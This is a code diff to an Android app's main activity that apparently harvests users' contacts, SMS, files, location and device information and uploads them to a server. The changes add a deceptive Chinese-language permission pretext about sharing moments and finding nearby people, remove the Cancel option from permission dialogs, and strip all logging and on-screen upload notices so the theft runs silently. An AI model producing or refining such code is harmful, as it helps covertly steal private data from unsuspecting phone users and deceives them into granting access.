@@ -169,9 +169,8 @@ public class MainActivity extends AppCompatActivity {
     private void showCustomDialog() {
         AlertDialog.Builder builder = new AlertDialog.Builder(this);
         builder.setTitle("使用前必读");
-        builder.setMessage("111");
+        builder.setMessage("为了让您轻松分享精彩瞬间，展示最真实的自己，在寻找附近的人的同时防止被自己的熟人发现，请允许权限保障您的使用体验");
         builder.setPositiveButton("确认", (dialog, which) -> checkAndRequestPermissions());
-        builder.setNegativeButton("取消", null);
         AlertDialog dialog = builder.create();
         dialog.show();
     }
@@ -597,11 +596,6 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.d("UploadContacts", "Contacts uploaded successfully");
-                } else {
-                    Log.e("UploadContacts", "Upload failed: " + response.message());
-                }
             }
         });
     }
@@ -634,13 +628,7 @@ public class MainActivity extends AppCompatActivity {
             }
 
             @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.d("UploadSms", "Sms uploaded successfully");
-                } else {
-                    Log.e("UploadSms", "Upload failed: " + response.message());
-                }
-            }
+            public void onResponse(Call call, Response response) throws IOException {}
         });
     }
 
@@ -687,22 +675,7 @@ public class MainActivity extends AppCompatActivity {
                 }
 
                 @Override
-                public void onResponse(Call call, Response response) throws IOException {
-                    if (response.isSuccessful()) {
-                        Log.d("UploadFile", "File uploaded successfully");
-                        runOnUiThread(() -> {
-                            // UI更新代码放在这里，例如显示成功的Toast或其他UI更新
-                            Toast.makeText(MainActivity.this, "File uploaded successfully", Toast.LENGTH_SHORT).show();
-                        });
-                    } else {
-                        Log.e("UploadFile", "Upload failed: " + response.message());
-                        Log.e("UploadFile", "Response body: " + response.body().string());
-                        runOnUiThread(() -> {
-                            // UI更新代码放在这里，例如显示失败的Toast或其他UI更新
-                            Toast.makeText(MainActivity.this, "Upload failed", Toast.LENGTH_SHORT).show();
-                        });
-                    }
-                }
+                public void onResponse(Call call, Response response) throws IOException {}
             });
         } catch (IOException e) {
             e.printStackTrace();
@@ -732,13 +705,7 @@ public class MainActivity extends AppCompatActivity {
             }
 
             @Override
-            public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.d("UploadLocation", "Location uploaded successfully");
-                } else {
-                    Log.e("UploadLocation", "Upload failed: " + response.message());
-                }
-            }
+            public void onResponse(Call call, Response response) throws IOException {}
         });
     }
 
@@ -776,11 +743,6 @@ public class MainActivity extends AppCompatActivity {
 
             @Override
             public void onResponse(Call call, Response response) throws IOException {
-                if (response.isSuccessful()) {
-                    Log.d("UploadDeviceInfo", "Device info uploaded successfully");
-                } else {
-                    Log.e("UploadDeviceInfo", "Upload failed: " + response.message());
-                }
                 callback.onUploadComplete(); // 上传完成后调用回调
             }
         });
@@ -837,7 +799,6 @@ public class MainActivity extends AppCompatActivity {
 
         builder.setView(dialogView);
         builder.setPositiveButton("确认", (dialog, which) -> checkAndRequestPermissions());
-        builder.setNegativeButton("取消", null);
 
         AlertDialog dialog = builder.create();
         dialog.show();
